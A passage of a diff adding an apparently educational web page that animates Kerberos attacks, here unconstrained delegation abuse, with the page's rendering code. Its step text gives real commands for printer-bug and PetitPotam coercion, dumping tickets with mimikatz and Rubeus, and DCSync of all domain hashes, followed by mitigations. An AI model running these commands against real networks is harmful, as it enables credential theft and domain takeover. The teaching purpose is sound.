+					{ id: 'dc', type: 'dc', label: 'Domain Controller', sublabel: 'Target', x: 85, y: 60 }
+				],
+				steps: [
+					{
+						title: 'What is Unconstrained Delegation?',
+						description: 'Unconstrained Delegation allows a service to impersonate users to ANY other service. The server stores the user\'s TGT for later use.',
+						activeEntity: 'delegsrv',
+						techDetail: `<strong>How It Works:</strong><br>
+							1. User authenticates to service with delegation<br>
+							2. User's TGT is included in the request<br>
+							3. Server caches the user's TGT<br>
+							4. Server can use TGT to access other services as user<br><br>
+							<strong>LDAP Flag:</strong><br>
+							<code>userAccountControl</code> bit 0x80000 (TRUSTED_FOR_DELEGATION)<br><br>
+							<strong>Query:</strong><br>
+							<code>(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))</code>`,
+						warning: 'Servers with unconstrained delegation are high-value targets!'
+					},
+					{
+						title: 'Step 1: Compromise Delegation Server',
+						description: 'The attacker gains admin access to a server configured with unconstrained delegation.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Finding Delegation Servers:</strong><br>
+							• BloodHound: Look for "Unconstrained Delegation"<br>
+							• PowerView: <code>Get-DomainComputer -Unconstrained</code><br>
+							• LDAP query for TRUSTED_FOR_DELEGATION<br><br>
+							<strong>Common Targets:</strong><br>
+							• Legacy application servers<br>
+							• File servers (older configs)<br>
+							• Print servers<br>
+							• SQL servers with delegation`,
+						packetContents: null
+					},
+					{
+						title: 'Step 2: Wait for or Coerce High-Value User',
+						description: 'The attacker waits for a Domain Admin to connect, or actively coerces authentication using techniques like PrinterBug or PetitPotam.',
+						activeEntity: 'attacker',
+						techDetail: `<strong>Passive:</strong> Wait for admin to connect naturally<br><br>
+							<strong>Active (Coercion):</strong><br>
+							• PrinterBug: <code>SpoolSample.exe DC01 ATTACKER-SRV</code><br>
+							• PetitPotam: <code>PetitPotam.py ATTACKER-SRV DC01</code><br>
+							• PrintNightmare<br><br>
+							These force the DC's machine account to authenticate!`,
+						packetContents: null
+					},
+					{
+						title: 'Step 3: Victim Authenticates to Delegation Server',
+						description: 'When a user authenticates to the delegation server, their TGT is included and cached in LSASS memory.',
+						activeEntity: 'victim',
+						animation: { from: 'victim', to: 'delegsrv', packet: 'AP-REQ + TGT', type: 'ticket' },
+						techDetail: `<strong>The Dangerous Behavior:</strong><br>
+							• Normal service ticket in AP-REQ<br>
+							• PLUS: User's TGT forwarded!<br>
+							• TGT stored in server's LSASS<br>
+							• Can be extracted by admin<br><br>
+							<strong>If Coerced DC:</strong><br>
+							DC's machine account TGT is cached!`,
+						packetContents: {
+							'AP-REQ to Delegation Server:': '',
+							'ticket': 'Service ticket for delegation server',
+							'authenticator': 'Standard authenticator',
+							'TGT INCLUDED!': '← User\'s TGT forwarded to server!',
+							'  → tkt-sname': 'krbtgt/CORP.LOCAL',
+							'  → Can be used for ANY service!': ''
+						}
+					},
+					{
+						title: 'Step 4: Extract TGT from LSASS',
+						description: 'As admin on the delegation server, the attacker dumps all cached TGTs from LSASS, including the victim\'s.',
+						activeEntity: 'attacker',
+						animation: { from: 'delegsrv', to: 'attacker', packet: 'Extract TGT', type: 'malicious' },
+						techDetail: `<strong>Extraction:</strong><br>
+							<code>mimikatz# sekurlsa::tickets /export</code><br>
+							<code>Rubeus.exe dump /service:krbtgt</code><br>
+							<code>Rubeus.exe monitor /interval:5</code> (live capture)<br><br>
+							<strong>What You Get:</strong><br>
+							• TGT for anyone who authenticated<br>
+							• If coerced: DC$ machine account TGT!`,
+						packetContents: null
+					},
+					{
+						title: 'Step 5: Use Stolen TGT (e.g., DCSync)',
+						description: 'With a Domain Controller\'s TGT, the attacker can perform a DCSync attack to extract all password hashes from AD.',
+						activeEntity: 'attacker',
+						animation: { from: 'attacker', to: 'dc', packet: 'DCSync Request', type: 'malicious' },
+						techDetail: `<strong>With DC Machine Account TGT:</strong><br>
+							• DCSync: Extract all password hashes<br>
+							• KRBTGT hash → Golden Ticket<br>
+							• All user hashes → Mass compromise<br><br>
+							<strong>DCSync Command:</strong><br>
+							<code>mimikatz# lsadump::dcsync /all /csv</code>`,
+						packetContents: null
+					},
+					{
+						title: 'Attack Complete: Domain Compromise!',
+						description: 'Through unconstrained delegation abuse, the attacker has achieved domain compromise by stealing a DC\'s TGT.',
+						activeEntity: 'dc',
+						techDetail: `<strong>Impact:</strong><br>
+							• Complete domain compromise<br>
+							• All password hashes obtained<br>
+							• Golden Ticket capability<br>
+							• Persistent access<br><br>
+							<strong>Mitigations:</strong><br>
+							• Remove unconstrained delegation<br>
+							• Use constrained delegation instead<br>
+							• Protected Users group for admins<br>
+							• "Account is sensitive" flag<br>
+							• Monitor for TGT forwarding`,
+						warning: 'Unconstrained Delegation + Coercion = Domain Compromise!',
+						success: false
+					}
+				]
+			}
+		};
+
+		// Load Topic
+		function loadTopic(topicId) {
+			currentTopic = topicId;
+			currentStep = 0;
+			isPlaying = false;
+
+			// Update buttons
+			document.querySelectorAll('.topic-btn').forEach(btn => btn.classList.remove('active'));
+			event.target.classList.add('active');
+
+			// Reset UI
+			document.getElementById('playBtn').style.display = 'inline-block';
+			document.getElementById('pauseBtn').style.display = 'none';
+
+			renderFlowchart();
+			renderStepIndicator();
+			updateExplanation();
+		}
+
+		// Render Flowchart
+		function renderFlowchart() {
+			const container = document.getElementById('flowchartContainer');
+			const topic = topics[currentTopic];
+
+			// Clear existing entities (keep SVG)
+			container.querySelectorAll('.entity, .packet').forEach(el => el.remove());
+
+			// Add entities
+			topic.entities.forEach(entity => {
+				const div = document.createElement('div');
+				div.className = 'entity';
+				div.id = `entity-${entity.id}`;
+				div.style.left = `${entity.x}%`;
+				div.style.top = `${entity.y}%`;
+				div.innerHTML = `
+					<div class="entity-icon ${entity.type}" id="icon-${entity.id}">
+						<i class="fas ${getEntityIcon(entity.type)}"></i>
+					</div>
+					<div class="entity-label">${entity.label}</div>
+					<div class="entity-sublabel">${entity.sublabel}</div>
+				`;
+				container.appendChild(div);
+			});
+		}
+
+		function getEntityIcon(type) {
+			const icons = {
+				'client': 'fa-user',
+				'kdc': 'fa-server',
+				'krbtgt': 'fa-key',
+				'service': 'fa-database',
+				'attacker': 'fa-user-secret',
+				'dc': 'fa-building'
+			};
+			return icons[type] || 'fa-circle';
+		}
+
+		// Render Step Indicator
+		function renderStepIndicator() {
+			const container = document.getElementById('stepIndicator');
+			const topic = topics[currentTopic];
+			container.innerHTML = '';
+
+			topic.steps.forEach((step, index) => {
+				const dot = document.createElement('div');
+				dot.className = 'step-dot';
+				if (index === currentStep) dot.classList.add('active');
+				if (index < currentStep) dot.classList.add('completed');
+				if (currentTopic !== 'kerberos-auth') dot.classList.add('attack');
+				dot.onclick = () => goToStep(index);
+				container.appendChild(dot);
+			});
+		}
+
+		// Update Explanation Panel
+		function updateExplanation() {
+			const topic = topics[currentTopic];
+			const step = topic.steps[currentStep];
+			const panel = document.getElementById('stepContent');
+
+			let html = `<div class="step-title">${step.title}</div>`;
+			html += `<p class="step-desc">${step.description}</p>`;
+
+			if (step.techDetail) {
+				html += `<div class="tech-detail">${step.techDetail}</div>`;
+			}
+
+			if (step.packetContents) {
+				html += `<div class="packet-contents">`;
+				for (const [key, value] of Object.entries(step.packetContents)) {
+					if (value.includes('ENCRYPTED') || value.includes('encrypted')) {
+						html += `<div class="field"><span class="field-name">${key}</span><span class="field-value encrypted">${value}</span></div>`;
+					} else {
+						html += `<div class="field"><span class="field-name">${key}</span><span class="field-value">${value}</span></div>`;
+					}
+				}
+				html += `</div>`;
+			}
+
+			if (step.warning) {
+				html += `<div class="warning"><i class="fas fa-exclamation-triangle"></i> ${step.warning}</div>`;
+			}
+
+			if (step.success) {
+				html += `<div class="success"><i class="fas fa-check-circle"></i> Authentication successful!</div>`;
+			}
+
+			panel.innerHTML = html;
+
+			// Update active entity
+			document.querySelectorAll('.entity-icon').forEach(el => el.classList.remove('active'));
+			if (step.activeEntity) {
+				const icon = document.getElementById(`icon-${step.activeEntity}`);
+				if (icon) icon.classList.add('active');
+			}
+		}
+
+		// Animation Functions
+		function playAnimation() {
+			isPlaying = true;
+			document.getElementById('playBtn').style.display = 'none';
+			document.getElementById('pauseBtn').style.display = 'inline-block';
+			animateCurrentStep();
+		}
+
+		function pauseAnimation() {
+			isPlaying = false;
+			document.getElementById('playBtn').style.display = 'inline-block';
+			document.getElementById('pauseBtn').style.display = 'none';
+			if (animationTimeout) clearTimeout(animationTimeout);
+		}
+
+		function resetAnimation() {
+			pauseAnimation();
+			currentStep = 0;
+			renderStepIndicator();
+			updateExplanation();
+			// Remove any packets
+			document.querySelectorAll('.packet').forEach(el => el.remove());
+		}
+
+		function animateCurrentStep() {
+			const topic = topics[currentTopic];
+			const step = topic.steps[currentStep];
+
+			updateExplanation();
+			renderStepIndicator();
+
+			if (step.animation) {
+				animatePacket(step.animation, () => {
+					if (isPlaying) {
+						animationTimeout = setTimeout(() => {
+							nextStep();
+						}, 2000 / animationSpeed);
+					}
+				});
+			} else {
+				if (isPlaying) {
+					animationTimeout = setTimeout(() => {
+						nextStep();
+					}, 3000 / animationSpeed);
+				}
+			}
+		}
+
+		function animatePacket(animation, callback) {
+			const container = document.getElementById('flowchartContainer');
+			const fromEl = document.getElementById(`entity-${animation.from}`);
+			const toEl = document.getElementById(`entity-${animation.to}`);
+
+			if (!fromEl || !toEl) {
+				callback();
+				return;
+			}
+
+			const fromRect = fromEl.getBoundingClientRect();
+			const toRect = toEl.getBoundingClientRect();
+			const containerRect = container.getBoundingClientRect();
+
+			const packet = document.createElement('div');
+			packet.className = `packet ${animation.type}`;
+			packet.textContent = animation.packet;
+			container.appendChild(packet);
+
+			const startX = fromRect.left - containerRect.left + fromRect.width / 2;
+			const startY = fromRect.top - containerRect.top + fromRect.height / 2;
+			const endX = toRect.left - containerRect.left + toRect.width / 2;
+			const endY = toRect.top - containerRect.top + toRect.height / 2;
+
+			packet.style.left = `${startX}px`;
+			packet.style.top = `${startY}px`;
+			packet.style.opacity = '1';
+			packet.style.transform = 'translate(-50%, -50%)';
+			packet.style.transition = `all ${1.5 / animationSpeed}s ease-in-out`;
+
+			setTimeout(() => {
+				packet.style.left = `${endX}px`;
+				packet.style.top = `${endY}px`;
+			}, 50);
+
+			setTimeout(() => {
+				packet.style.opacity = '0';
+				setTimeout(() => {
+					packet.remove();
+					callback();
+				}, 300);
+			}, 1500 / animationSpeed);
+		}
+
+		function nextStep() {
+			const topic = topics[currentTopic];
+			if (currentStep < topic.steps.length - 1) {
+				currentStep++;
+				animateCurrentStep();
+			} else {
+				pauseAnimation();
+			}
+		}
+
+		function goToStep(index) {
+			pauseAnimation();
+			currentStep = index;
+			renderStepIndicator();
+			updateExplanation();
+		}
+
+		function updateSpeed(value) {
+			animationSpeed = parseFloat(value);
+			document.getElementById('speedLabel').textContent = `${value}x`;
+		}
+
+		// Initialize
+		document.addEventListener('DOMContentLoaded', function() {
+			loadTopic('kerberos-auth');
+		});
+	</script>
+</body>
+</html>
